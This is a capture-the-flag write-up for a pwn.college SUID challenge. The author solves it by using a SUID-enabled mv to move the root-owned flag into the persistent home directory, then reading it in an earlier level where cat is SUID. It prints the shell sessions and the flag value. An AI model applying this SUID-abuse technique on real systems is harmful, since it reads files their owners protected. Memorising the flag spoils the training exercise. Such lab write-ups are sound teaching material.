
I think this is the most ridiculously funny and interesting problem in this whole challenge.

https://unix.stackexchange.com/questions/131180/how-to-move-a-file-without-preserving-permissions

https://opensource.com/article/19/8/moving-files-linux-without-mv

After reading these article, I came to the conclusion that there is no way to move a file using `mv` command without preserving its attributes.

```bash
hacker@program-misuse-level-40:~$ /challenge/babysuid_level40 
Welcome to /challenge/babysuid_level40!

This challenge is part of a series of programs that
let you get the flag by doing tricks with permissions.

I just set the SUID bit on /usr/bin/mv.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level40) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/mv!
hacker@program-misuse-level-40:~$ ls
Desktop  demo
hacker@program-misuse-level-40:~$ mv /flag /home/hacker/
hacker@program-misuse-level-40:~$ ls
Desktop  demo  flag
hacker@program-misuse-level-40:~$ ls -l flag
-r-------- 1 root root 57 Jan  3 11:10 flag
hacker@program-misuse-level-40:~$ cat flag
cat: flag: Permission denied
```

After trying more than two hours, I came to an amazing idea. 

You see through the whole challenge, the `home` directory stays the same. You create a file, it will be there for the whole challenges. So If I move the file from the `root` directory to `home` directory, it will stay there forever.

Now if I go to the first challenge of this module, `Babysuid 1` where the `SUID` bit for `cat` has been set, I can `cat` the flag. Boom! You Got The Flag for `Babysuid 40`.

```bash
hacker@program-misuse-level-1:~$ ls
Desktop  demo  flag
hacker@program-misuse-level-1:~$ ls -l /usr/bin/cat
-rwxr-xr-x 1 root root 43416 Sep  5  2019 /usr/bin/cat
hacker@program-misuse-level-1:~$ /challenge/babysuid_level1 
Welcome to /challenge/babysuid_level1!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/cat.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level1) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/cat!
hacker@program-misuse-level-1:~$ ls -l /usr/bin/cat
-rwsr-xr-x 1 root root 43416 Sep  5  2019 /usr/bin/cat
hacker@program-misuse-level-1:~$ cat flag
pwn.college{09VJVeI9yMsKVaZRob4F_3lfkKm.0lM4EDL0AjNzQzW}
```

